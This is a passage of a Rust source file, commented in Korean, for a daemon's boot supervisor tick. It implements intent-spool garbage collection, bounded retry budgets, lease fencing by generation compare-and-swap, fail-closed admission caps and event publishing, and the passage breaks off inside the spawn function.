/// 이 이벤트가 "오래 쥐고 있다" 를 처음으로 말하는 지점이고, 회수 주체가 없는 상태
/// (`confirmed_exit_observed=false`)에서 원장이 굳고 있다는 신호다.
fn notify_orphan_aged_once(daemon: &Arc<Daemon>, st: &mut SupState, held: usize, aged: usize) {
    if st.orphan_aged_reported {
        return;
    }
    st.orphan_aged_reported = true;
    publish(
        daemon,
        "boot_supervisor.orphan_aged",
        json!({"held": held, "aged": aged, "cap": MAX_LIVE_BOOT_RUNS,
               "age_threshold_secs": FENCED_REAP_AGE_SECS,
               "note": "보유 고아가 인텐트 수명만큼 오래됐다 — 지우지는 않는다(확인된 exit 만이 근거). 회수 주체(A18 [5] · B4)가 없는 동안 원장이 굳고 있다는 진단 신호다"}),
    );
}

fn notify_capped_once(daemon: &Arc<Daemon>, st: &mut SupState, kind: &str, why: &str) {
    if st.notify_capped_reported {
        return;
    }
    st.notify_capped_reported = true;
    publish(
        daemon,
        "boot_supervisor.notify_capped",
        json!({"kind": kind, "why": why,
               "latch_cap": MAX_UNDELETABLE, "pane_cap_per_tick": MAX_RETIRE_NOTIFY_PER_TICK,
               "note": "무스폰 통보가 유계로 잘린다(feed·이벤트는 계속 나간다)"}),
    );
}

/// 한 틱. 디스크 I/O + (있으면) 실행. **동기**이며 호출자가 `catch_unwind` 로 감싼다.
/// 반환값은 이번 틱의 디스패치 횟수(테스트가 유계성을 세는 축).
fn tick_in(
    daemon: &Arc<Daemon>,
    dir: &Path,
    st: &mut SupState,
    runner: Runner,
    remover: Remover,
    now: f64,
) -> usize {
    // ★(P2 · R3-RISK-1) kill-switch 게이트 — pause 중에는 낳지도 지우지도 않는다
    //   (schedule.rs `scheduler_tick` 선두 게이트와 동형). 오너의 어떤 입력이든 kill-switch 를
    //   눌렀다는 뜻이고, 그 순간 기계가 새 프로세스를 낳는 것이 정확히 pause 가 막으려는 것이다.
    if daemon.paused.load(Ordering::Relaxed) {
        return 0;
    }
    // ★스풀 권한 **재강제**(unix 0o700) — 있을 때만. 없으면 **만들지 않는다**:
    //   감독자는 관측자이지 생산자가 아니고, 스풀 생성은 인텐트를 적는 쪽의 일이다.
    //   ★현행 사실(R2 · 2026-08-26 정정): 정상 경로의 **유일한 writer 는 데몬 자신**이다
    //   (`boot.enqueue`→`write_intent`→`ensure_spool` — 0700/0600 원자 기록). 종전 주석은
    //   '지금 생산자가 없다 = 디스크 자국 0' 과 '생산자가 셸이면(U-24) umask 로 넓어진다'를
    //   근거로 들었는데 둘 다 이 캠페인으로 낡았다(셸 생산자는 존재하지 않는다).
    //   그래서 이 재강제는 **잔여 방어**다: 구 릴리스가 남긴 스풀·수동 조작·복원 도구가
    //   넓혀 놓은 권한을 데몬이 만날 수 있고, 그때 이 한 줄이 없으면 스풀은 한 번도 조여지지
    //   않은 채로 남는다. 정상 경로에서는 아무 것도 바꾸지 않는 잉여이며 그 사실이 의도다.
    if dir.exists() {
        let _ = ensure_spool(dir);
    }
    let scan = scan_spool(dir, now, st.cursor);
    st.cursor = scan.next_cursor;
    // 음성 캐시 회수 — 파일이 실제로 사라진 키만 버린다(위 필드 주석의 '나이 만료 금지').
    st.undeletable.retain(|(p, _)| Path::new(p).exists());
    // 무스폰 통보 래치 회수 — 스풀에서 사라진 id 만(재선언은 선언별 유일 id 라 어차피 새 키다).
    st.no_spawn_notified.retain(|id| scan.present.contains(id));

    // ── 디스크 GC(파싱 불가·mtime 초과) ────────────────────────────────────────
    for (p, why) in &scan.garbage {
        // ★B3-5(§2-6 · H-LEASE-3): 파싱 불가는 **조용히 지우지 않는다** — terminal 로 닫고
        //   미러 줄을 남긴다. 닫는 데 성공하면 파일은 이미 `.done` 이므로 삭제를 시도하지
        //   않는다(시도하면 실패해 undeletable 캐시에 쌓이고 매 틱 소음이 된다).
        if *why == "unparsable" {
            if st.unreadable_records < MAX_UNREADABLE_RECORDS {
                if close_unreadable(daemon, dir, p, now) {
                    st.unreadable_records += 1;
                    continue;
                }
                // 닫지 못했으면 아래 종전 삭제 경로로 흘려보낸다(쓰레기를 남기지 않는다).
            } else if !st.unreadable_capped_reported {
                st.unreadable_capped_reported = true;
                publish(
                    daemon,
                    "boot_supervisor.unreadable_records_capped",
                    json!({"cap": MAX_UNREADABLE_RECORDS,
                           "note": "손상 인텐트 terminal 기록이 상한에 걸렸다 — 이후로는 기록 없이 폐기한다(스풀 무한 성장 방지). 상한에 걸린 것 자체가 병리 신호다"}),
                );
            }
        }
        if let Some(removed) = remove_and_gate(st, remover, p, why) {
            publish(
                daemon,
                "boot_supervisor.intent_discarded",
                json!({"path": p.to_string_lossy(), "why": why, "removed": removed}),
            );
        }
    }

    // ── 맵 3종 방어 ────────────────────────────────────────────────────────────
    // ② 나이 만료 — 스풀에서 사라졌어도 예산은 수명만큼 기억한다(즉시 재등록으로 예산을
    //    리셋하는 우회 차단). ③ 매 틱 retain 은 아래 캡 뒤가 아니라 여기서 함께 본다.
    st.budget
        .retain(|id, (_, last)| now - *last <= INTENT_MAX_AGE_SECS || scan.present.contains(id));
    // ① 상한 — ★`clear()` 하지 않는다(결함 2a 수리).
    //   종전 주석은 "비워도 디스크측 예산이 남아 상한을 계속 집행한다" 고 했다. 그러나 두 축을
    //   **함께 둔 근거 자체**가 '읽기전용 스풀·디스크 만실에서 attempts 가 영원히 0' 인
    //   상황이다 — 바로 그 상황에서 clear 가 일어나면 두 축이 **동시에** 무너져 인텐트당
    //   3회 상한이 무력화된다(매 틱 프로세스 1개 = 폭주). 그래서 상한 집행은:
    //     ⓐ **스풀에 없는** 항목만, 오래된 것부터 솎는다(LRU — 살아있는 예산은 건드리지 않는다).
    //     ⓑ 그래도 넘치면(= 실재하는 인텐트만으로 상한 초과) **낳는 것을 멈춘다**.
    //        살아있는 예산을 버려 맵 크기를 지키는 것은 유계를 파는 것이다 — 그럴 바엔 낳지 않는다.
    //        멈춰도 스풀은 GC·Retire 로 계속 줄어들므로 이 상태는 스스로 풀린다.
    let mut suspend_dispatch = false;
    if st.budget.len() > MAX_TRACKED {
        let over = st.budget.len() - MAX_TRACKED;
        let mut evictable: Vec<(f64, String)> = st
            .budget
            .iter()
            .filter(|(id, _)| !scan.present.contains(*id))
            .map(|(id, (_, last))| (*last, id.clone()))
            .collect();
        evictable.sort_by(|a, b| a.0.total_cmp(&b.0));
        let evicted = evictable.len().min(over);
        for (_, id) in evictable.into_iter().take(over) {
            st.budget.remove(&id);
        }
        suspend_dispatch = st.budget.len() > MAX_TRACKED;
        if !st.budget_pressure_reported {
            st.budget_pressure_reported = true;
            publish(
                daemon,
                "boot_supervisor.budget_pressure",
                json!({"entries": st.budget.len(), "evicted": evicted, "cap": MAX_TRACKED,
                       "dispatch_suspended": suspend_dispatch}),
            );
        }
    }

    // ★B3-2R ④ⓓ fence 고아의 **추정 회수** — 나이로만 접는다.
    //   이것은 관측이 아니라 추정이다(진짜 회수는 `try_wait` 관측 ④ⓐ·러너 자멸 ④ⓒ 이고 둘 다
    //   B4 다). 여기서 접지 않으면 상한이 한 번 차는 순간 **부트가 영구 정지**한다 — 유계는
    //   지키되 영구 정지는 만들지 않는다는 균형이고, 그 정직한 한계는 모듈 머리말에 적었다.
    //
    // ★R4 [5](codex major 일부 · master 심판 · **지금 명시**): 그 균형은 **미무장에서만** 옳다.
    //   미무장이면 dispatch 가 0 이므로 추정이 틀려도 새 프로세스가 늘지 않고, 이 접기는 상한이
    //   한 번 차면 부트가 영영 안 나는 것만 막는다. 그러나 armed 가 되는 순간 같은 삭제는
    //   **살아 있는 고아를 없는 것으로 세어 새 런을 낳는 문**이 된다 — fence 가 막으려던 바로
    //   그 이중 실행이다. 확인된 exit(§2-7 러너의 ACK)과 영속 history 가 착지하기 전까지
    //   armed 에서는 회수하지 않고 **fail-closed** 로 둔다(구현 완성은 B4 · 계약은 여기서 못박는다).
    //   ★unknown-live 도 같은 방향이다: 관측이 안 되면 상한에 걸린 것으로 친다
    //   (`admission_state` 가 `None` 을 돌리는 갈래 — 못 세는데 낳는 것이 이 축의 최악이다).
    //   ★R5 [4] 개정(codex · master 심판): 그 자제를 **armed 무관**으로 넓혔다. 종전에는
    //   미무장에서만 나이로 지웠는데, 대조군이 '나이가 지나면 지운다' 이면 **exit ACK 없는
    //   삭제를 정상으로 검증**하게 된다. 나이는 근거가 아니라 진단이다 — 원장에서 빼는 유일한
    //   근거는 확인된 exit 관측(A18 [5] · B4)이고, 그때까지 원장은 보유만 한다.
    let (held, aged) = match daemon.boot_fenced.lock() {
        Ok(g) => (
            g.len(),
            g.iter().filter(|f| now - f.at >= FENCED_REAP_AGE_SECS).count(),
        ),
        // 못 세면 상한에 걸린 것으로 친다(fail-closed · admission 과 같은 규율).
        Err(_) => (MAX_LIVE_BOOT_RUNS, 0),
    };
    if held > 0 {
        notify_orphan_hold_once(daemon, st, held, aged);
    }
    // ★R6 [3]: aged 전이는 **별도 래치**다. 위 고지와 같은 래치를 쓰면 young 에서 한 번
    //   발화한 뒤 aged 가 되는 순간이 영영 조용해진다(나이를 진단 축으로 남긴 의미 소실).
    if aged > 0 {
        notify_orphan_aged_once(daemon, st, held, aged);
    }

    // ── 판정·실행 ──────────────────────────────────────────────────────────────
    let mut dispatched = 0usize;
    // ★(R2 must_fix) 무스폰 통보의 **pane 주입 틱 예산**. 폐기는 스캔 상한(64)까지 갈 수
    //   있으므로 pause 회복 직후처럼 다수가 한꺼번에 `expired` 로 접히는 순간에 선언 pane 이
    //   주입 홍수를 맞는 것을 막는다. feed·이벤트는 이 예산과 무관하게 나가고, 폐기(삭제)도
    //   무관하게 계속한다 — 잘리는 것은 홍수 채널 하나뿐이다.
    let mut pane_notices = MAX_RETIRE_NOTIFY_PER_TICK;
    for it in &scan.intents {
        // ★재스냅샷은 디스패치 예산 **앞**이다: 스위치를 내린 사람은 즉시 롤백을 기대하는데,
        //   예산에 걸려 뒤로 밀리면 그 기대가 틱 수만큼 늦어진다. 스캔 상한(64)이 이미 유계다.
        // ★다시 찍었으면 **이 틱의 나머지도 새 값을 봐야 한다.** 처음 배선은 디스크만 고치고
        //   `it` 은 낡은 값 그대로였는데, 같은 틱의 디스패치가 그 낡은 값으로 파일을 다시 써서
        //   재스냅샷을 통째로 덮었다(검체가 잡았다). 스냅샷은 한 곳에서만 진실이어야 한다.
        let mut resnapped: Option<BootIntent> = None;
        if let Some(next) = resnapshot_executor(it.state, &it.executor, !st.boot_v2_off) {
            let mut re = it.clone();
            re.executor = next.to_string();
            match write_intent(dir, &re) {
                Ok(_) => {
                    publish(
                        daemon,
                        "boot_supervisor.executor_resnapshot",
                        json!({"id": it.id, "from": it.executor, "to": next,
                               "note": "롤백 스위치가 꺼졌다 — 아직 착수하지 않은 인텐트만 다시 찍는다(running 은 태어난 대로 완주)"}),
                    );
                    resnapped = Some(re);
                }
                // 실패는 삼키지 않는다 — 다음 틱이 같은 판정으로 다시 시도한다(멱등).
                Err(e) => publish(
                    daemon,
                    "boot_supervisor.executor_resnapshot_failed",
                    json!({"id": it.id, "to": next, "error": e}),
                ),
            }
        }
        let it = resnapped.as_ref().unwrap_or(it);
        if dispatched >= MAX_DISPATCH_PER_TICK {
            break;
        }
        let (mem_attempts, mem_last) = st.budget.get(&it.id).copied().unwrap_or((0, 0.0));
        let attempts = effective_attempts(it.attempts, mem_attempts);
        // ★메모리측 쿨다운 — 디스크에 `next_attempt_at` 이 적히지 못했어도(읽기전용 스풀)
        //   같은 인텐트를 쿨다운 안에 다시 낳지 않는다(폭주 차단 ③).
        if mem_attempts > 0 && now < backoff_until(mem_attempts, mem_last) {
            continue;
        }
        // ★B3(§2-6) fence — `running` 런의 lease 를 회수할지 판정한다.
        //
        // ★**죽이지 않는다**(master 판정 2026-09-05). 명세 §2-6 의 '구 러너 pid SIGTERM' 절은
        //   **의도적 미구현**이다 — 이 모듈의 절대계약 '아무것도 죽이지 않는다'(오살 0 · 소스핀
        //   `H-BOOT-SUP-1`)가 개별 명세 절보다 앞선다. 안전성을 보증하는 것은 세대 상승 후의
        //   **CAS 거절**(`lease_stale`)이지 kill 이 아니다 — 명세 자신이 그렇게 적는다.
        //
        // ★**재개 디스패치는 이 단위에 없다**(리뷰 계류). 명세 §2-6 은 fence 뒤 재개를 요구하는데,
        //   그 절반은 '구 러너는 무해하므로 새로 낳아도 둘이 되지 않는다'는 가정에 의존한다.
        //   그 가정이 지금 반증 심사 중이다(리뷰어 gemini REVISE ③ '블로킹 러너 자멸불능').
        //   그래서 **순수 안전인 절반만** 넣는다: 세대를 올려 구 러너를 무력화한다. 새 프로세스는
        //   낳지 않으므로 가정이 틀려도 손해가 없고, 가정이 확정되면 재개는 덧붙이면 된다.
        //   fence 된 런은 종전대로 수명 상한(`expired`)이 걷는다.
        if it.state == IntentState::Running && !st.fence_armed {
            // ★R3 #7(codex BLOCK · master 심판): **무장 전에는 판정조차 하지 않는다.**
            //   세대 상승·재개는 물론이고 판정 자체를 막는 이유는, 판정이 이벤트로 나가면
            //   '무장했다' 는 잘못된 인상을 주고 다음 사람이 그 위에 재개를 얹기 때문이다.
            //   fence 의 안전성은 '세대가 오르면 구 러너의 RPC 가 거절된다' 에 전적으로 기대는데
            //   그 거절을 집행할 주체(§2-7 러너 CAS·자멸)가 아직 없다 — 그 창에서 세대만 올리면
            //   막은 것 없이 표와 파일만 흔든다.
            notify_fence_disarmed_once(daemon, st);
        } else if it.state == IntentState::Running {
            let verdict = daemon.boot_run_active.lock().ok().and_then(|g| {
                g.values()
                    .find(|r| r.intent == it.id && r.generation == it.generation)
                    // ★B3-3: ⓑ 진행 정체는 ⓐ hb 정지 **위에 독립으로** 얹는다(동결된
                    //   `fence_verdict` 본문 무접촉). 먼저 잡히는 축이 사유가 되고, 둘 다
                    //   침묵하면 fence 하지 않는다.
                    .and_then(|r| {
                        fence_verdict(r, now)
                            .or_else(|| progress_verdict(r, now))
                            .map(|why| (why, r.pid))
                    })
            });
            if let Some((why, pid)) = verdict {
                // ★B3-2R ③(codex③) **fence 자체가 CAS 다.** 스캔은 스냅샷이라, 그 사이 러너가
                //   terminal 을 기록했거나 다른 세대가 착지했을 수 있다. 그대로 세대를 올리면
                //   **완료된 런을 fence 해** 이중 재개의 문을 연다. 그래서 쓰기 직전에 디스크를
                //   다시 읽어 기대 상태(running ∧ generation == 관측값)를 확인한다.
                let fresh = std::fs::read_to_string(intent_path(dir, &it.id))
                    .ok()
                    .and_then(|b| BootIntent::from_str(&it.id, &b));
                let matched = fence_cas_ok(fresh.as_ref(), it.generation);
                if !matched {
                    publish(
                        daemon,
                        "boot_supervisor.fence_skipped",
                        json!({"id": it.id, "why": why, "reason": "cas_mismatch",
                               "expected_generation": it.generation,
                               "found_generation": fresh.as_ref().map(|f| f.generation),
                               "found_state": fresh.as_ref().map(|f| f.state.as_str())}),
                    );
                } else {
                    let mut fenced = it.clone();
                    fenced.generation = it.generation.saturating_add(1);
                    // 영속이 먼저다 — 실패하면 표도 건드리지 않는다(파일과 표가 갈리면 CAS 판정이
                    // 둘로 나뉜다). 다음 틱이 같은 판정으로 다시 시도한다.
                    match write_intent(dir, &fenced) {
                        Err(e) => publish(
                            daemon,
                            "boot_supervisor.fence_failed",
                            json!({"id": it.id, "why": why, "error": e, "fenced": false}),
                        ),
                        Ok(_) => {
                            // ★R3 #4(codex): active → fenced 를 **두 표를 동시에 쥔 채** 옮긴다.
                            //   잠금 순서를 고정한다(fenced → active) — 이 둘이 함께 잡히는 곳은
                            //   여기뿐이라 고정 순서로 교착이 없다. 종전엔 표의 세대만 올려서
                            //   '활성인데 fence 된' 중간 상태가 존재했다.
                            //   ★재fence 금지(#9): 같은 (intent, epoch, generation) 이 이미 원장에
                            //   있으면 넣지 않는다 — 중복은 admission 분모를 부풀려 부트를 이유
                            //   없이 멈춘다. epoch 가 키에 있어 재시작 전후가 갈린다.
                            if let (Ok(mut hist), Ok(mut act)) =
                                (daemon.boot_fenced.lock(), daemon.boot_run_active.lock())
                            {
                                let key = (it.id.as_str(), st.epoch, it.generation);
                                let dup = hist.iter().any(|f| f.key() == key);
                                if !dup && hist.len() < MAX_LIVE_BOOT_RUNS {
                                    hist.push(FencedRun {
                                        intent: it.id.clone(),
                                        epoch: st.epoch,
                                        generation: it.generation,
                                        pid,
                                        why,
                                        at: now,
                                    });
                                }
                                // 소유권을 잃은 런은 **활성이 아니다** — 표에서 뺀다(원자 이동).
                                //   ★해제 경로 ② fence(B4-1): 레인 키로 뺀다.
                                let lane = act
                                    .iter()
                                    .find(|(_, r)| r.intent == it.id)
                                    .map(|(l, _)| l.clone());
                                if let Some(l) = lane {
                                    act.remove(&l);
                                }
                            }
                            // ★B3-2R ⑥ fence 된 시도는 **terminal 과 다른 칸**에 남긴다. terminal 은
                            //   '이 인텐트가 어떻게 끝났는가' 하나뿐이라 거기 쓰면 마지막 하나만
                            //   남고 앞의 이력이 사라진다(codex⑤). 이 원장은 동시에 ④ⓓ 전역
                            //   상한의 분모이기도 하다 — 무kill 이라 이 고아는 살아 있을 수 있다.
                            publish(
                                daemon,
                                "boot_supervisor.fenced",
                                json!({"id": it.id, "why": why, "pid": pid,
                                       "generation": fenced.generation, "resumed": false}),
                            );
                        }
                    }
                }
            }
        }
        match decide(it, attempts, now) {
            Disposition::Wait { .. } => {}
            Disposition::Retire(why) => {
                // ★(R2 must_fix) **스폰 0회 종착은 전부 loud 다** — 종전엔 `attempts_exhausted`
                //   하나만 통보하고 claim_stale·no_surface·expired·schema_mismatch·
                //   unknown_action·unknown_decl_origin 은 버스 이벤트만 낸 채 사라졌다.
                //   frontdoor note 가 모델에게 '곧 스폰한다 · 소진 시 통보한다'고 약속한 뒤
                //   훅이 exit 0 한 경로에서는 그 침묵이 곧 '선언했는데 무반응'이다.
                //   통보가 **삭제보다 앞**이다 — 순서가 뒤집히면 삭제 실패 게이트(음성 캐시)의
                //   조용한 분기가 통보까지 삼킬 여지가 생긴다.
                notify_no_spawn(daemon, st, it, why, &mut pane_notices);
                // 폐기는 통보 예산·삭제 실패와 무관하게 계속한다 — 스풀을 줄이는 방향이고,
                // 쓰레기·적대 인텐트의 GC 를 통보 예산에 묶으면 스풀이 줄지 않는다.
                if let Some(removed) =
                    remove_and_gate(st, remover, &intent_path(dir, &it.id), why)
                {
                    publish(
                        daemon,
                        "boot_supervisor.intent_retired",
                        json!({"id": it.id, "action": it.action_token, "why": why,
                               "attempts": attempts, "removed": removed}),
                    );
                }
            }
            Disposition::Run(action) => {
                if suspend_dispatch {
                    continue; // 예산 포화 — 유계가 우선이다(낳지 않는다).
                }
                // ★R3 #6(codex): admission 을 **예산 소비보다 먼저** 검사한다. 종전엔 attempts·
                //   generation 을 올려 영속한 **뒤** 상한을 봤는데, 그러면 상한에 걸릴 때마다 낳지도
                //   않고 예산만 태운다 — 세 번 걸리면 그 선언은 `attempts_exhausted` 로 **영영 뜨지
                //   못한다**. 일시 정지가 조용히 종착이 되는 자리라 순서가 계약이다.
                // ★R3 #3(codex): 관측 실패는 **상한으로 친다**(fail-closed). 못 세는데 낳는 것이
                //   이 축에서 가장 나쁜 실패다 — 유계가 무너진 것을 아무도 모르게 된다.
                let Some((orphans, active)) = admission_state(daemon) else {
                    notify_admission_capped(daemon, st, None);
                    publish(
                        daemon,
                        "boot_supervisor.admission_unobservable",
                        json!({"id": it.id, "spawned": false,
                               "why": "표 잠금 실패(poison 등) — 관측 불능은 통과가 아니다"}),
                    );
                    continue;
                };
                if orphans + active >= MAX_LIVE_BOOT_RUNS {
                    notify_admission_capped(daemon, st, Some((orphans, active)));
                    publish(
                        daemon,
                        "boot_supervisor.admission_capped",
                        json!({"id": it.id, "orphans": orphans, "active": active,
                               "max": MAX_LIVE_BOOT_RUNS, "spawned": false}),
                    );
                    continue;
                }
                let next = attempts + 1;
                st.budget.insert(it.id.clone(), (next, now));
                // 디스크측 예산 선기록 — 실행 **전**에 올려 둬야 이 사이에 데몬이 죽어도
                // 다음 세대가 시도 수를 잃지 않는다(예산의 안전 방향 = 과소가 아니라 과다).
                let mut persisted = it.clone();
                persisted.attempts = next;
                // ★B3(명세 §2-6): `generation+1` 도 **스폰 전에** 영속한다. 이 값이 곧 lease 이고
                //   러너의 side-effect RPC 는 이것으로 CAS 된다 — 스폰 뒤에 올리면 그 사이 살아난
                //   러너가 **낡은 세대**로 RPC 를 통과시킨다(fencing 의 존재 이유가 사라진다).
                persisted.generation = it.generation.saturating_add(1);
                persisted.next_attempt_at = backoff_until(next, now);
                // ★B3-2R ③(codex③): **영속 실패 = spawn 금지**. 종전엔 `persist_err` 를 이벤트에
                //   실어 보내면서 **그대로 스폰**했다 — 그러면 시도 수와 세대가 디스크에 없는 채
                //   프로세스가 태어나고, 그 프로세스가 든 lease 는 어떤 영속 근거도 갖지 못한다
                //   (재시작하면 세대가 되감겨 ABA 가 열린다). fence 이전부터 있던 결함이고
                //   내 B3-1 이 그대로 물려받았다. 여기서 닫는다 — 낳지 않는 쪽이 안전하다.
                if let Some(e) = write_intent(dir, &persisted).err() {
                    publish(
                        daemon,
                        "boot_supervisor.persist_failed",
                        json!({"id": it.id, "action": action.as_str(), "attempt": next,
                               "error": e, "spawned": false}),
                    );
                    continue;
                }
                // ★B3(§3-3): 데몬 표 등록은 **스폰 전**이다 — 스폰 뒤에 등록하면 먼저 도착한
                //   러너 RPC 가 CAS 할 표를 못 찾아 거절된다(경주에서 정상 부트가 진다).
                //   `pid` 는 스폰 뒤에야 알 수 있으므로 여기서는 `None` 이고 성공 시 채운다.
                //   `roles` 는 지금 비어 있다: 채우는 주체가 §2-7 러너(B4)다.
                // ★B4-1: 등록은 **덮어쓰기가 아니라 예약**이다(codex R7 [2]). 이미 그 레인이
                //   활성이면 낳지 않는다 — 덮어쓰면 원래 런이 표에서 사라져 관측 밖 고아가 된다.
                let lane = it.lane.clone();
                let reservation = reserve_admission(
                    daemon,
                    &lane,
                    BootRunActive {
                        intent: it.id.clone(),
                        generation: persisted.generation,
                        roles: Vec::new(),
                        hb: now,
                        progress_step: String::new(),
                        // ★B3-3: 정체 기준 시각은 등록 시각에서 출발한다. 단계 이름이 비어
                        //   있는 동안은 판정이 발효하지 않으므로(동형 게이트) 이 값은 B4 가
                        //   첫 단계를 보고할 때 비로소 의미를 갖는다 — **둘은 함께 움직인다**.
                        progress_at: now,
                        started: now,
                        pid: None,
                        epoch: st.epoch,
                    },
                );
                let reservation = match reservation {
                    Ok(r) => r,
                    Err(why) => {
                        publish(
                            daemon,
                            "boot_supervisor.admission_reservation_failed",
                            json!({"id": it.id, "lane": lane, "why": why.as_str(),
                                   "generation": persisted.generation, "epoch": st.epoch,
                                   "note": "예약 실패 — 덮어쓰지 않고 낳지 않는다(G1: 레인당 실행 ≤1). occupied 는 정상 유계이고 unobservable 은 관측 불능이라 조치가 다르다"}),
                        );
                        continue;
                    }
                };
                debug_assert_eq!(
                    reservation.key(),
                    (it.id.as_str(), st.epoch, persisted.generation),
                    "예약 키가 고아 원장 키와 다른 모양이다 — 상한 계수가 갈린다"
                );
                // ★예약에 성공한 뒤에야 디스패치로 센다 — 예약 실패는 디스패치가 아니다.
                dispatched += 1;
                // 러너에게는 **새 세대를 실은 인텐트**를 넘긴다(원장 줄의 attempts 도 실제로 실행된
                // 값이 된다 — 종전엔 한 세대 낡은 값이 실렸다).
                let outcome = dispatch_one(daemon, &persisted, action, runner);
                match outcome {
                    Ok(detail) => {
                        // ★B3(명세 §2-6): 스폰 성공은 인텐트를 **지우지 않는다** — `state=running`
                        //   으로 전이해 러너가 소유권(lease)을 갖는다. 종전의 삭제는 "실행됐다"는
                        //   사실과 "누가 몇 세대로 실행 중인가"를 **동시에 잃었다**: 그래서 재개도
                        //   fencing 도 불가능했고, 크래시한 러너와 살아 있는 러너를 구별할 근거가
                        //   디스크에 남지 않았다.
                        //   전이 실패는 삼키지 않는다(`transition_error`) — 실패하면 파일은 여전히
                        //   `pending` 이라 수명 안에서 재디스패치가 일어날 수 있다. 그것은 유계이고
                        //   (attempts 상한) 조용하지 않은 것이 조용한 것보다 낫다.
                        // ★B3-2R ④ⓑ: 실행자가 돌려준 `pid=<n>` 을 표에 싣는다 — **관측용이지
                        //   종료용이 아니다**(이 감독자는 아무것도 죽이지 않는다). 고아가 생겼을 때
                        //   사람이 `cys ps`·watchdog 으로 찾아갈 수 있게 하는 것이 전부다.
                        let pid = detail
                            .strip_prefix("pid=")
                            .and_then(|v| v.trim().parse::<u32>().ok());
                        if let Ok(mut g) = daemon.boot_run_active.lock() {
                            if let Some(r) = g.get_mut(&lane) {
                                if r.intent == it.id {
                                    r.pid = pid;
                                }
                            }
                        }
                        let mut running = persisted.clone();
                        running.state = IntentState::Running;
                        let transition_err = write_intent(dir, &running).err();
                        publish(
                            daemon,
                            "boot_supervisor.dispatched",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "detail": detail,
                                   "state": running.state.as_str(),
                                   "generation": running.generation, "pid": pid,
                                   "transition_error": transition_err}),
                        );
                        // ★해제 경로 ④ **관측 주체가 없는 실행자**(codex BLOCK · 2026-09-05).
                        //   python 체인은 데몬의 자식이지만 데몬은 그 exit 을 관측하지 않는다
                        //   (`spawn` 갈래에서 `drop(child)` — 주석 자신이 명문화한다). 관측하지
                        //   않는 런의 슬롯을 계속 쥐면 그 레인은 **같은 데몬 수명 동안 다시는
                        //   부트하지 못한다**: 실측으로 2차 부트가 Occupied 로 거절됐고 6틱
                        //   (t=2..202) 동안 회복되지 않았다. 기본 경로가 첫 부트 뒤 멎는다.
                        //   ★예약의 의미는 '데몬이 exit 을 관측할 런' 이다. python 은 그 대상이
                        //   아니므로 **즉시 놓는다**. 이 경로의 상호배제는 부트 스크립트가
                        //   소유한다 — `javis_bootstrap.py` 의 싱글플라이트 락이 BUSY 면 패자가
                        //   `exit 11` 로 접힌다(별 프로세스 실측: acquired/busy/해제 후 acquired).
                        //   ★단 그 락은 **무조건이 아니다**: `javis_lock` 부재와 UNAVAILABLE 두
                        //   갈래에서 직렬화 없이 진행한다(각각 경고 1줄). 그 갈래에서도 이 예약이
                        //   상호배제를 준 적은 없다 — 영구 거절을 줬을 뿐이고, B4-1 이전 동작
                        //   (덮어쓰기)과 같은 수준이다. 문서가 아니라 실행으로 확인한 사실이다.
                        //   ★대가: python 런은 표에 남지 않아 **pid 관측을 잃는다**. pid 는 바로
                        //   위 `dispatched` 이벤트에 그대로 실리므로 사라지지 않는다.
                        //   ★정공법(자식 exit 을 비동기로 관측해 `release_confirmed_exit` 호출)은
                        //   **다섯째 해제 경로**이고 프로세스 수명 관리를 건드리므로 B4-R 로
                        //   이관했다 — 이 릴리스는 부트 v2 를 휴면으로 싣는다.
                        if persisted.executor == EXECUTOR_PYTHON {
                            release_admission(daemon, reservation.lane());
                        }
                    }
                    // (P2 · R3-P2-5) 전제 붕괴(claim_stale) — 재시도가 아니라 **폐기**다.
                    // 좌석이 죽어 레지스트리에서 master 가 사라졌다면 남은 2회 재시도도 같은
                    // 판정으로 전소할 뿐이다 — 정직한 정지(오너 재선언 = 재개 신호·무스폰).
                    // ★(R2 must_fix) 실행자가 스폰 **전에** 접은 종착(claim_stale·no_surface)도
                    //   스폰 0회다 — 위 Disposition::Retire 와 같은 계급으로 loud 다. 여기는
                    //   MAX_DISPATCH_PER_TICK 이 이미 틱당 2건으로 유계라 별도 통보 예산을
                    //   두지 않는다(래치가 인텐트당 1회를 마저 집행한다).
                    Err(RunErr::Retire(why)) => {
                        // ★해제 경로 ③ **스폰 시도 실패**(master ⓒ · B4-1): 예약해 놓고
                        //   낳지 못했으면 슬롯을 즉시 놓는다. 놓지 않으면 그 레인이
                        //   **다시는 부트하지 못한다** — 예약을 넣으면서 해제를 빠뜨리는
                        //   것과 같은 계열이고, retry 가 상한(3회)까지 도는지가 실측이다.
                        release_admission(daemon, &lane);
                        notify_no_spawn(daemon, st, it, why, &mut pane_notices);
                        if let Some(removed) =
                            remove_and_gate(st, remover, &intent_path(dir, &it.id), why)
                        {
                            publish(
                                daemon,
                                "boot_supervisor.intent_retired",
                                json!({"id": it.id, "action": action.as_str(), "why": why,
                                       "attempt": next, "removed": removed}),
                            );
                        }
                    }
                    Err(RunErr::Retry(why)) => {
                        // ★해제 경로 ③ **스폰 시도 실패**(master ⓒ · B4-1): 예약해 놓고
                        //   낳지 못했으면 슬롯을 즉시 놓는다. 놓지 않으면 그 레인이
                        //   **다시는 부트하지 못한다** — 예약을 넣으면서 해제를 빠뜨리는
                        //   것과 같은 계열이고, retry 가 상한(3회)까지 도는지가 실측이다.
                        release_admission(daemon, &lane);
                        if next >= MAX_ATTEMPTS {
                            let _ = remover(&intent_path(dir, &it.id));
                        }
                        publish(
                            daemon,
                            "boot_supervisor.dispatch_failed",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "max": MAX_ATTEMPTS, "why": why}),
                        );
                        // (P2 · 오너 결정 ⑧c) 마지막 시도까지 스폰이 실패했다 — loud 종착.
                        if next >= MAX_ATTEMPTS {
                            notify_no_spawn(daemon, st, it, "dispatch_failed", &mut pane_notices);
                        }
                    }
                }
            }
        }
    }
    dispatched
}

fn publish(daemon: &Arc<Daemon>, name: &str, payload: serde_json::Value) {
    daemon.bus.publish(name, "boot_supervisor", None, payload);
}

/// 감독자 기동 — **별도 `tokio::spawn` + 자기 cadence**.
///
/// watchdog 틱 안에 두면 부트 1회가 큐 배달·승인 격상·데드맨·회수를 수십 초 정지시킨다
/// (모듈 헤더 'watchdog 틱을 절대 막지 않는다' 절). 이 함수가 `governance` 가 아니라 여기
/// 있는 것 자체가 그 계약의 구조적 표현이다.
pub fn spawn(daemon: Arc<Daemon>) {
    let off = supervisor_off_from(
        std::env::var(cys::ENV_BOOT_GATES).ok().as_deref(),
